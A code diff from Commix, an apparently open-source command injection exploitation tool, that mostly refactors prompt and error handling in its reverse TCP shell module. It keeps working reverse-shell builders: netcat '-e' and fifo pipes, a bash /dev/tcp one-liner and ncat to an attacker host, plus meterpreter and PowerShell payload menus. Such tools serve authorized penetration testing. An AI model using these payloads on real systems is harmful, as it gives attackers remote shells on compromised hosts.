@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2022 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -21,6 +21,7 @@ import base64
 import random
 import string
 import subprocess
+from src.utils import common
 from src.utils import menu
 from src.utils import update
 from src.utils import settings
@@ -34,7 +35,7 @@ Check for available shell options.
 """
 def shell_options(option):
   if option.lower() == "reverse_tcp":
-    warn_msg = "You are already into the '" + option.lower() + "' mode."
+    warn_msg = "You are into the '" + option.lower() + "' mode."
     print(settings.print_warning_msg(warn_msg))
   elif option.lower() == "?": 
     menu.reverse_tcp_options()
@@ -94,25 +95,19 @@ Set up the PHP working directory on the target host.
 """
 def set_php_working_dir():
   while True:
-    if not menu.options.batch:
-      question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
-      question_msg += "' as PHP working directory on the target host? [Y/n] > "
-      php_dir = _input(settings.print_question_msg(question_msg))
-    else:
-      php_dir = ""
-    if len(php_dir) == 0:
-       php_dir = "Y"
+    message = "Do you want to use '" + settings.WIN_PHP_DIR 
+    message += "' as PHP working directory on the target host? [Y/n] > "
+    php_dir = common.read_input(message, default="Y", check_batch=True)
     if php_dir in settings.CHOICE_YES:
       break
     elif php_dir in settings.CHOICE_NO:
-      question_msg = "Please provide a custom working directory for PHP (e.g. '" 
-      question_msg += settings.WIN_PHP_DIR + "') > "
-      settings.WIN_PHP_DIR = _input(settings.print_question_msg(question_msg))
+      message = "Please provide a custom working directory for PHP (e.g. '" 
+      message += settings.WIN_PHP_DIR + "') > "
+      settings.WIN_PHP_DIR = common.read_input(message, default=None, check_batch=True)
       settings.USER_DEFINED_PHP_DIR = True
       break
     else:
-      err_msg = "'" + php_dir + "' is not a valid answer."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(php_dir)  
       pass
 
 """
@@ -120,25 +115,19 @@ Set up the Python working directory on the target host.
 """
 def set_python_working_dir():
   while True:
-    if not menu.options.batch:
-      question_msg = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER 
-      question_msg += "' as Python interpreter on the target host? [Y/n] > "
-      python_dir = _input(settings.print_question_msg(question_msg))
-    else:
-      python_dir = ""
-    if len(python_dir) == 0:
-       python_dir = "Y"
+    message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER 
+    message += "' as Python interpreter on the target host? [Y/n] > "
+    python_dir = common.read_input(message, default="Y", check_batch=True)
     if python_dir in settings.CHOICE_YES:
       break
     elif python_dir in settings.CHOICE_NO:
-      question_msg = "Please provide a full path directory for Python interpreter (e.g. '" 
-      question_msg += "C:\\Python27\\python.exe') > "
-      settings.WIN_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
+      message = "Please provide a full path directory for Python interpreter (e.g. '" 
+      message += "C:\\Python27\\python.exe') > "
+      settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
       settings.USER_DEFINED_PYTHON_DIR = True
       break
     else:
-      err_msg = "'" + python_dir + "' is not a valid answer."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(python_dir)  
       pass
 
 """
@@ -146,25 +135,19 @@ Set up the Python interpreter on linux target host.
 """
 def set_python_interpreter():
   while True:
-    if not menu.options.batch:
-      question_msg = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
-      question_msg += "' as Python interpreter on the target host? [Y/n] > "
-      python_interpreter = _input(settings.print_question_msg(question_msg))
-    else:
-      python_interpreter = ""
-    if len(python_interpreter) == 0:
-       python_interpreter = "Y"
+    message = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
+    message += "' as Python interpreter on the target host? [Y/n] > "
+    python_interpreter = common.read_input(message, default="Y", check_batch=True)
     if python_interpreter in settings.CHOICE_YES:
       break
     elif python_interpreter in settings.CHOICE_NO:
-      question_msg = "Please provide a custom working interpreter for Python (e.g. '" 
-      question_msg += "python27') > "
-      settings.LINUX_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
+      message = "Please provide a custom working interpreter for Python (e.g. '" 
+      message += "python27') > "
+      settings.LINUX_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
       settings.USER_DEFINED_PYTHON_INTERPRETER = True
       break
     else:
-      err_msg = "'" + python_interpreter + "' is not a valid answer."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(python_interpreter)  
       pass
 
 """
@@ -228,13 +211,12 @@ def netcat_version(separator):
   ]
 
   while True:
-    nc_version = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Netcat reverse TCP shells""" + Style.RESET_ALL + """ ]--- 
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
-Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
-Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 
-Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbsd on target host. 
-\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
+    nc_version = _input("""""" + Style.BRIGHT + """Available netcat reverse TCP shell options:""" + Style.RESET_ALL + """
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbsd on target host. 
+commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
     
     # Default Netcat
     if nc_version == '1':
@@ -258,18 +240,12 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
         return shell_options(nc_version)
     # Invalid option    
     else:
-      err_msg = "The '" + nc_version + "' option, is not valid."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(nc_version)
       continue
 
   while True:
-    if not menu.options.batch:
-      question_msg = "Do you want to use '/bin' standard subdirectory? [y/N] > "
-      enable_bin_dir = _input(settings.print_question_msg(question_msg))
-    else:
-      enable_bin_dir = ""
-    if len(enable_bin_dir) == 0:
-       enable_bin_dir = "n"              
+    message = "Do you want to use '/bin' standard subdirectory? [y/N] > "
+    enable_bin_dir = common.read_input(message, default="N", check_batch=True)             
     if enable_bin_dir in settings.CHOICE_NO:
       break  
     elif enable_bin_dir in settings.CHOICE_YES :
@@ -279,17 +255,16 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
     elif enable_bin_dir in settings.CHOICE_QUIT:
       raise SystemExit()
     else:
-      err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(enable_bin_dir)  
       pass
 
   if nc_version != '4':
     # Netcat with -e
-    cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e " + shell
+    cmd = nc_alternative + settings.SINGLE_WHITESPACE + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + " -e " + shell
   else:
     # nc without -e 
     cmd = shell + " -c \"" + shell + " 0</tmp/f | " + \
-           nc_alternative + " " + settings.LHOST + " " + settings.LPORT + \
+           nc_alternative + settings.SINGLE_WHITESPACE + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + \
            " 1>/tmp/f\""
 
   return cmd
@@ -301,22 +276,21 @@ Set up other [1] reverse tcp shell connections
 def other_reverse_shells(separator):
 
   while True:
-    other_shell = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Generic reverse TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
-Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
-Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
-Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
-Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
-Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Bash reverse TCP shell.
-Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Ncat reverse TCP shell.
-Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python reverse TCP shell (windows).
-\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """11""" + Style.RESET_ALL + """' to use a meterpreter reverse TCP shell (windows). 
-Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web delivery script. 
-\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
+    other_shell = _input("""""" + Style.BRIGHT + """Available generic reverse TCP shell options:""" + Style.RESET_ALL + """
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Bash reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Ncat reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python reverse TCP shell (windows).
+""" + Style.BRIGHT + """Available meterpreter reverse TCP shell options:""" + Style.RESET_ALL + """
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """11""" + Style.RESET_ALL + """' to use a meterpreter reverse TCP shell (windows). 
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web delivery script. 
+commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     
     # PHP-reverse-shell
     if other_shell == '1':
@@ -370,12 +344,12 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
     elif other_shell == '6':
       tmp_file = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(5)])
       other_shell = "echo \"/bin/sh 0>/dev/tcp/"+ settings.LHOST + "/" + settings.LPORT + \
-                    " 1>%260 2>%260\" > /tmp/" + tmp_file + " " + separator + " /bin/bash /tmp/" + tmp_file
+                    " 1>%260 2>%260\" > /tmp/" + tmp_file + settings.SINGLE_WHITESPACE + separator + " /bin/bash /tmp/" + tmp_file
       break
 
     # Ncat-reverse-shell 
     elif other_shell == '7':
-      other_shell = "ncat " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"
+      other_shell = "ncat " + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + " -e /bin/sh"
       break
 
     # Windows Python-reverse-shell
@@ -476,7 +450,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         with open (output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          #data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
+          #data = base64.b64encode(data.encode(settings.DEFAULT_CODEC)).decode()
           
         print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
@@ -508,11 +482,10 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         continue
       else:
         while True:
-          windows_reverse_shell = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
-Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
-\ncommix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
+          windows_reverse_shell = _input("""""" + Style.BRIGHT + """Available powershell injection options:""" + Style.RESET_ALL + """
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
+commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
           if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS): 
             if shell_options(windows_reverse_shell):
@@ -522,8 +495,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's 
           elif windows_reverse_shell == '2' :
             output = "powershell_attack.txt"
           else:
-            err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
-            print(settings.print_error_msg(err_msg))
+            common.invalid_option(windows_reverse_shell)
             continue
 
           if not os.path.exists(settings.METASPLOIT_PATH):
@@ -579,7 +551,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's 
                   unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
                   os.chdir(unicorn_path)
                 gen_payload_msg(payload)
-                subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
+                subprocess.Popen("python unicorn.py" + settings.SINGLE_WHITESPACE + str(payload) + settings.SINGLE_WHITESPACE + str(settings.LHOST) + settings.SINGLE_WHITESPACE + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
                 other_shell = _urllib.parse.quote_plus(other_shell) 
@@ -605,12 +577,11 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's 
     # Web delivery script
     elif other_shell == '12':
       while True:
-        web_delivery = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Web delivery script""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use meterpreter reverse TCP shell (windows).
-\ncommix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
+        web_delivery = _input("""""" + Style.BRIGHT +  """Available web delivery script options:""" + Style.RESET_ALL + """
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use meterpreter reverse TCP shell (windows).
+commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
 
         if any(option in  web_delivery.lower() for option in settings.SHELL_OPTIONS):  
           if shell_options(web_delivery):
@@ -622,8 +593,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use meterpreter r
         elif web_delivery == '3':
           payload = "windows/meterpreter/reverse_tcp"
         else:
-          err_msg = "The '" + web_delivery + "' option, is not valid."  
-          print(settings.print_error_msg(err_msg))
+          common.invalid_option(web_delivery)
           continue
 
         if not os.path.exists(settings.METASPLOIT_PATH):
@@ -678,8 +648,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use meterpreter r
         return shell_options(other_shell)
     # Invalid option
     else:
-      err_msg = "The '" + other_shell + "' option, is not valid."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(other_shell)
       continue
 
   return other_shell
@@ -690,14 +659,13 @@ Choose type of reverse TCP connection.
 def reverse_tcp_options(separator):
 
   while True:
-    reverse_tcp_option = _input("""   
----[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' for netcat reverse TCP shells.
-Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.
-\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
+    reverse_tcp_option = _input("""""" + Style.BRIGHT + """Available reverse TCP shell options:""" + Style.RESET_ALL + """    
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' for netcat reverse TCP shells.
+""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.
+commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
 
     if reverse_tcp_option.lower() == "reverse_tcp": 
-      warn_msg = "You are already into the '" + reverse_tcp_option.lower() + "' mode."
+      warn_msg = "You are into the '" + reverse_tcp_option.lower() + "' mode."
       print(settings.print_warning_msg(warn_msg))
       continue
 
@@ -723,8 +691,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TC
         return shell_options(reverse_tcp_option)
     # Invalid option    
     else:
-      err_msg = "The '" + reverse_tcp_option + "' option, is not valid."  
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(reverse_tcp_option)
       continue
 
   return reverse_tcp_option
@@ -735,9 +702,10 @@ Set up the reverse TCP connection
 def configure_reverse_tcp(separator):
   # Set up LHOST for the reverse TCP connection
   while True:
-    option = _input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
+    sys.stdout.write(settings.REVERSE_TCP_SHELL)
+    option = _input()
     if option.lower() == "reverse_tcp": 
-      warn_msg = "You are already into the '" + option.lower() + "' mode."
+      warn_msg = "You are into the '" + option.lower() + "' mode."
       print(settings.print_warning_msg(warn_msg))
       continue
     if option.lower() == "?": 
@@ -781,12 +749,10 @@ def configure_reverse_tcp(separator):
       elif option[4:12].lower() == "uripath ":
         check_uripath(option[12:])
       else:
-        err_msg = "The '" + option + "' option, is not valid."
-        print(settings.print_error_msg(err_msg))
+        common.invalid_option(option)
         pass
     else:
-      err_msg = "The '" + option + "' option, is not valid."
-      print(settings.print_error_msg(err_msg))
+      common.invalid_option(option)
       pass
 
 # eof
